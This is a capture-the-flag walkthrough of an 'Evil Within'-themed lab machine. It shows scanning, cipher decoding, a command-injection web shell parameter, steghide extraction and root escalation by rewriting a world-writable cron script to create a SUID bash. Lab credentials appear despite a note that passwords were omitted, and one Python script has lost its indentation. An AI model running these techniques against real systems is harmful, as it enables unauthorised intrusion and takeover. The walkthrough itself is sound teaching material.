## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Help Sebastian and his team of investigators to withstand the dangers that come ahead.
This room is based on a video game called evil within. I am a huge fan of this game. So I decided to make a CTF on it. With my storyline :). Your job is to help Sebastian and his team of investigators to withstand the dangers that come ahead.

[Hints are provided as you progress through the challenge]

The VM might take up to 2-3 minutes to fully boot up.
```

## RustScan
```bash
$rustscan -a 10.49.155.158 -b 450 -t 2000 --ulimit 5000 -- -e tun0 -sC -sV > Network.txt
Open 10.49.155.158:21
Open 10.49.155.158:22
Open 10.49.155.158:80

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 ProFTPD 1.3.5a
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:2f:fb:3b:f3:95:c3:c6:df:31:d6:e0:9e:99:92:42 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDtgGI2Qpv+ora/iClEVeJSyw673ED4ciilMWv/Cw2NtVl9oB8A5rKktZYnJDw5sYZOvXimjb20Rk6a742anZZA87PM3StTZy8ZAMDEwdt8omaz5zy1c+HcJi4jjUIzPAZK10iKJ0JnyZ3eZZgEXALsU1zTi6U8Wn+6pixB9yRzAV8FVd/UThmC8vkiyNbNJUF6tgP+paajOIq2KzcmYrn8zZFL79EjDUUqSx72/wc/VUYyNArVGtVmOuvW1TBQwnpUv3zNQL1sabfiRzmgWB4unfHCVbj8autfHOfHSpMxC5QOuOJRTdhak6MUlHbjSXBF5MU1OP4mNTIoh/+e8k17
|   256 92:24:36:91:7a:db:62:d2:b9:bb:43:eb:58:9b:50:14 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCE8pJD7f5qX4X2kInnJf/m5wbTLOFA3I49Hyi2MrHxg3jREHseTbpqk00Xmy7F2+8Z8ljTdJwD9aafUAPgXxes=
|   256 34:04:df:13:54:21:8d:37:7f:f8:0a:65:93:47:75:d0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPxHqNM/ISBztZhs47D+flKJiTqFqt5kJrFDoeNyO8Zb
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Becon Mental Hospital
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

## Web Browser
```html
<html>
<head>
	<title>Welcome To Becon Mental Hospital</title>
	<link rel="stylesheet" type="text/css" href="../css/mainstylesheet.css">
</head>
<body>

	<h1 style="text-align: center;">All Begins From Here</h1>
	<div class="center-wrapper">
		<img src="hospital.png">
	</div>
	<!-- Sebastian sees a path through the darkness which leads to a room => /sadistRoom -->
	<br>
	<p>Welcome to Beacon Mental Hospital. Sebastian Castellanos and his partners, Joseph Oda and Juli Kidman received a call from dispatch that there was just an incident at the hospital. So they began their investigation. Unfortunately, the team got separated.</p>
	<br>
	<p>Your job is to stand beside the team and help them to withstand the challenges which are coming ahead ...</p>
	<a href="map.html" style="color: #fff;">Here is the map</a>
</body>
</html>
```

- Noted: <!-- Sebastian sees a path through the darkness which leads to a room => /sadistRoom -->
- Visit `http://10.49.155.158/sadistRoom`
```html
<html>
<head>
	<title>Sadiest Room</title>
	<link rel="stylesheet" type="text/css" href="../css/mainstylesheet.css">
</head>
<body>
	<h1 style="text-align: center;">Sadist Room</h1>
	<br>
	<br>
	<div class="center-wrapper">
		<img class="imgsource" src="key.png" style="width: 60%;">
	</div>
	<br>
	<p class="para">Sebastian Found a key to the locker room. Click <a class="keypressed" href="">here</a> to get the key.</p>
	<br>
	<br>
	<!-- To find more about Sadist visit https://theevilwithin.fandom.com/wiki/Sadist -->
	<div class="center-wrapper">
		<button class="btn btn-danger">Go to Locker Room</button>
	</div>
	<script src="../js/jquery.min.js"></script>
	<script src="scripts.js"></script>
</body>
</html>
```
- Visit `http://10.49.155.158/sadistRoom/scripts.js`
```js
$(".keypressed").click(function(e) {
	e.preventDefault();
	alert("Key to locker Room => 532219a04ab7a02b56faafbec1a4c1ea")
	setTimeout(function() {
	    
		herecomesSadist();
	}, 1500);
});
function herecomesSadist(){
	$("body").css("background-color","#000");
	$(".para").text("Escape to locker Room before its too late !!!");
	$(".para").addClass("danger")
	$(".center-wrapper").css("display","none");
	$(".imgsource").attr('src', 'EscapingSadist.jpg');
	$(".imgsource").css('height', '300px');
	$(".imgsource").css('width', '500px');
	$(".center-wrapper").css("display","flex");
	$(".btn-danger").css("display","flex")
	$(".btn-danger").css("background-color","#f50000")
	$(".btn-danger").css("color","#000")

	setTimeout(function() {
	    
		$("body").css("background-color","#f50000");
		$(".imgsource").attr('src', 'SadistShred.gif');
		$(".center-wrapper").css("display","flex");
		$(".para").text("Too Late Sebastian is dead !!!");
		$(".para").css('color', '#000');
		$(".para").css('text-align', 'center');
		$(".para").css('font-size', '25px');
		$(".btn-danger").css("display","none");

	}, 6000);
}

$(".btn-danger").click(function(e) {
	const key = prompt("Enter Key To The Locker Room ");
	if (key == "532219a04ab7a02b56faafbec1a4c1ea"){
		window.open("../lockerRoom/","_self")
	}
});
```

### Instant bypasses:

- Open DevTools → copy key
- Run in console:
    `window.open("../lockerRoom/","_self")`
- Manually browse to `/lockerRoom/`
## Next
```html
<html> <head> <title>Locker Room</title> <link rel="stylesheet" type="text/css" href="../css/mainstylesheet.css"> </head> <body> <h1 style="text-align: center;">Locker Room</h1> <br> <div class="center-wrapper"> <img class="imgsource" style="width: 60%;" src="sadiestEntrance.jpg"> </div> <br> <p>Sebastian is hiding inside a locker to make it harder for the sadist to find him. While Sebastian was inside the locker he found a note. That looks like a map of some kind. </p> <p>Decode this piece of text "Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv" and get the key to access the map<p> <p>Click <a href="../map.php">here</a> to veiw the map ...</p> </body> </html>
```
- Message `Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv`
- It is `Atbash cipher` which is decoded as 
```Decoded Text
Grant_me_access_to_the_map_please
```
- New page open
```html
<strong>Here is the map</strong> <br><br> <a href="sadistRoom/">1. Sadist Room</a> <br><br> <a href="lockerRoom/">2. Locker Room</a> <br><br> <a href="SafeHeaven/">3. Safe Heaven</a> <br><br> <a href="abandonedRoom/">4. The Abandoned Room</a> 
<html>
<head>
	<title>Map</title>
</head>
<body>
	<br>
	<br>
	<br>
	<p>Enter Key To access the map</p>
	<form action="" method="post">
	<input type="text" id="keycheck" name="keycheck">
</body>
</html>
```
- Lets Scan the abandand room 
```bash
$ gobuster dir -u http://10.49.155.158/SafeHeaven/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,json,txt \
-t 50
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.155.158/SafeHeaven/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,json
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1299]
/imgs                 (Status: 301) [Size: 324] [--> http://10.49.155.158/SafeHeaven/imgs/]
/keeper               (Status: 301) [Size: 326] [--> http://10.49.155.158/SafeHeaven/keeper/]
```
- `Keeper` is the endpoint
- Visit `http://10.49.155.158/SafeHeaven/keeper/` it shows an pic which is `St. Augustine Lighthouse`
```html
<!DOCTYPE html>
<html>
<head>
	<title>You got the Keeper Key</title>
</head>
<body>
	<h1 style="text-align: center;">You Got The Keeper Key !!!</h1>
	<br>
	<p>Here is your key : 48ee41458eb0b43bf82b986cecf3af01</p>
</body>
</html>
```
- Got the Key `48ee41458eb0b43bf82b986cecf3af01`
- Move to next room
```Burp Req
GET /abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=ls HTTP/1.1
Host: 10.49.155.158
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
- Allow `?Shell=` Runs Commands like `ls`
```Result
assets
dead.php
herecomeslara.php
index.php
script.js
```
- New payload `?shell=ls+..`
```Result
[flag/hash omitted]
[flag/hash omitted]
index.php
```
- Visit `http://10.49.155.158/abandonedRoom/680e89809965ec41e64dc7e447f175ab/`
```Result
helpme.zip	           2020-07-09 13:52	26K	 
you_made_it.txt	       2020-07-22 01:22	62	 
```
- File `you_made_it.txt`
```you_made_it.txt
you_made_it.txt
```
- File `helpme.zip`
## Files 
```bash
$ unzip helpme.zip
Archive:  helpme.zip
  inflating: helpme.txt
  inflating: Table.jpg

┌──(kali㉿kali)-[~/Downloads]
└─$ cat helpme.txt
From Joseph,
Who ever sees this message "HELP Me". Ruvik locked me up in this cell. Get the key on the table and unlock this cell. I'll tell you what happened when I am out of
this cell.

┌──(kali㉿kali)-[~/Downloads]
└─$ file Table.jpg
Table.jpg: Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified Jul 07 2020 22:37:08, uncompressed size 25399, method=deflate

┌──(kali㉿kali)-[~/Downloads]
└─$ mv Table.jpg table.zip

┌──(kali㉿kali)-[~/Downloads]
└─$ unzip table.zip
Archive:  table.zip
  inflating: Joseph_Oda.jpg
  inflating: key.wav

┌──(kali㉿kali)-[~/Downloads]
└─$ ls
helpme.txt  helpme.zip  Joseph_Oda.jpg  key.wav  table.zip

┌──(kali㉿kali)-[~/Downloads]
└─$ file Joseph_Oda.jpg
Joseph_Oda.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 350x490, components 3
```
- Analyze Audio File on `https://morsecode.world/international/decoder/audio-decoder-adaptive.html` & Got The Pass `SHOWME`
```bash
└─$ ls
helpme.txt  helpme.zip  Joseph_Oda.jpg  key.wav  table.zip

┌──(kali㉿kali)-[~/Downloads]
└─$ steghide extract -sf Joseph_Oda.jpg
Enter passphrase: "SHOWME"
wrote extracted data to "thankyou.txt".
```
- File `thankyou.txt`
```bash
 cat thankyou.txt

From joseph,

Thank you so much for freeing me out of this cell. Ruvik is nor good, he told me that his going to kill sebastian and next would be me. You got to help
Sebastian ... I think you might find Sebastian at the Victoriano Estate. This note I managed to grab from Ruvik might help you get inn to the Victoriano Estate.
But for some reason there is my name listed on the note which I don't have a clue.

           --------------------------------------------
        //                                              \\
        ||      (NOTE) FTP Details                      ||
        ||      ==================                      ||
        ||                                              ||
        ||      USER : joseph                           ||
        ||      PASSWORD : intotheterror445             ||
        ||                                              ||
        \\                                              //
           --------------------------------------------
Good luck, Be carefull !!!
```
## FTP
```bash
$ ftp 10.49.155.158
Connected to 10.49.155.158.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.49.155.158]
Name (10.49.155.158:kali): joseph
331 Password required for joseph
Password:
230 User joseph logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||56044|)
150 Opening ASCII mode data connection for file list
-rwxr-xr-x   1 joseph   joseph   11641688 Aug 13  2020 program
-rw-r--r--   1 joseph   joseph        974 Aug 13  2020 random.dic
226 Transfer complete
ftp> get program
local: program remote: program
229 Entering Extended Passive Mode (|||60854|)
150 Opening BINARY mode data connection for program (11641688 bytes)
100% |************************************************************************| 11368 KiB  887.36 KiB/s    00:00 ETA
226 Transfer complete
11641688 bytes received in 00:12 (876.03 KiB/s)
ftp> get random.dic
local: random.dic remote: random.dic
229 Entering Extended Passive Mode (|||52483|)
150 Opening BINARY mode data connection for random.dic (974 bytes)
100% |************************************************************************|   974      334.44 KiB/s    00:00 ETA
226 Transfer complete
974 bytes received in 00:00 (11.78 KiB/s)
ftp> exit
221 Goodbye.
```
## Lets Analyze
```bash
$ nano python.py
```
- File
```python
import os 
f = open('random.dic', 'r')
lines = f.readlines() 
count = 0 
for line in lines: 
count += 1 
if "Incorrect" not in os.popen("./program " + line).read(): 
os.system("./program " + line) 
break
```
## RUN
```bash
$ python3 python.py
kidman => Correct

Well Done !!!
Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33
```
## Cipher
```Cipher
55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33
```
## Decoded Text
```Decode
Kidman:KIDMANSPASSWORDISSOSTRANGE
```

## SSH
```bash
$ssh kidman@10.48.157.210
Password: [password omitted]
kidman@evilwithin:~$ ls
user.txt
kidman@evilwithin:~$ cat user.txt
[flag/hash omitted]
kidman@evilwithin:/home/kidman$ ls -la
total 44
drwxr-xr-x 4 kidman kidman 4096 Aug 13  2020 .
drwxr-xr-x 5 root   root   4096 Jul 13  2020 ..
-rw------- 1 kidman kidman    1 Aug 13  2020 .bash_history
-rw-r--r-- 1 kidman kidman  220 Jul 13  2020 .bash_logout
-rw-r--r-- 1 kidman kidman 3771 Aug 13  2020 .bashrc
drwx------ 2 kidman kidman 4096 Jul 13  2020 .cache
drwxrwxr-x 2 kidman kidman 4096 Jul 13  2020 .nano
-rw-r--r-- 1 kidman kidman  655 Jul 13  2020 .profile
-rw-rw-r-- 1 kidman kidman  264 Aug 13  2020 .readThis.txt
-rw-r--r-- 1 root   root     26 Jan 14 13:16 .the_eye.txt
-rw-rw-r-- 1 kidman kidman   33 Jul 13  2020 user.txt
kidman@evilwithin:/home/kidman$ cat .the_eye.txt
No one can escape from me
```
- File `.readThis.txt`
```bash
kidman@evilwithin:/home/kidman$ cat .readThis.txt

uC@> z:5>2?i

%96 E9:?8 x 2> 23@FE E@ E6== D@ :D E@A D64C6E] }@ @?6 5@6D?VE <?@H 23@FE E9:D] xEVD E96 #FG:<VD 6J6] }@ @?6 42? 9:56 2H2J 7C@> :E] qFE x 42? E6== J@F @?6 E9:?8 D62C49 7@C E96 DEC:?8 YE9606J60@70CFG:<Y ] *@F 8@E E@ 96=A $632DE:2? 56762E #FG:< ]]]
```
- Encrypted in `ROT47` 
```Decoded
From Kidman:  

The thing I am about to tell so is top secret. No one doesn't know about this. It's the Ruvik's eye. No one can hide away from it. But I can tell you one thing search for the string *the_eye_of_ruvik* . You got to help Sebastian defeat Ruvik 
```
## CronTab
```bash
kidman@evilwithin:/home/kidman$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

*/2 * * * * root python3 /var/.the_eye_of_ruvik.py
kidman@evilwithin:/home/kidman$ ls
user.txt
kidman@evilwithin:/home/kidman$ cd ..
kidman@evilwithin:/home$ ls
joseph  kidman  ruvik
kidman@evilwithin:/home$ cd ruvik/
kidman@evilwithin:/home/ruvik$ ls
kidman@evilwithin:/home/ruvik$ ls -la
total 24
drwxr-xr-x 2 ruvik ruvik 4096 Jul 13  2020 .
drwxr-xr-x 5 root  root  4096 Jul 13  2020 ..
-rw------- 1 ruvik ruvik    5 Jul 13  2020 .bash_history
-rw-r--r-- 1 ruvik ruvik  220 Jul 13  2020 .bash_logout
-rw-r--r-- 1 ruvik ruvik 3771 Jul 13  2020 .bashrc
-rw-r--r-- 1 ruvik ruvik  655 Jul 13  2020 .profile
kidman@evilwithin:/home/ruvik$ cat /var/.the_eye_of_ruvik.py
#!/usr/bin/python3

import subprocess
import random

stuff = ["I am watching you.","No one can hide from me.","Ruvik ...","No one shall hide from me","No one can escape from me"]
sentence = "".join(random.sample(stuff,1))
subprocess.call("echo %s > /home/kidman/.the_eye.txt"%(sentence),shell=True)

kidman@evilwithin:/home/ruvik$ ls /var/.the_eye_of_ruvik.py
/var/.the_eye_of_ruvik.py
kidman@evilwithin:/home/ruvik$ ls -la /var/.the_eye_of_ruvik.py
-rwxr-xrw- 1 root root 300 Aug 14  2020 /var/.the_eye_of_ruvik.py
```
## Escalation
Edit the file:
```bash
$nano /var/.the_eye_of_ruvik.py
```
- Replace everything with:
```python
#!/usr/bin/python3 
import os 
os.system("cp /bin/bash /tmp/rootbash") 
os.system("chmod +s /tmp/rootbash")`
Save and exit.
```
- Run
```bash
kidman@evilwithin:/home/ruvik$ nano /var/.the_eye_of_ruvik.py
kidman@evilwithin:/home/ruvik$ /tmp/rootbash -p
rootbash-4.3#
rootbash-4.3# whoami
root
rootbash-4.3# id
uid=1002(kidman) gid=1002(kidman) euid=0(root) egid=0(root) groups=0(root),1002(kidman)
rootbash-4.3# cd /root
rootbash-4.3# ls
readMe.txt  root.txt
rootbash-4.3# cat root.txt
[flag/hash omitted]
rootbash-4.3# cat readMe.txt
/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
|  From Sebastian :                                                  |
|                                                                    |
|  You have one final task ... Help me to defeat ruvik !!!                      |
|                                                                    |
 \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
rootbash-4.3#
```

## Root Flag
```Flag
[flag/hash omitted]
```

## END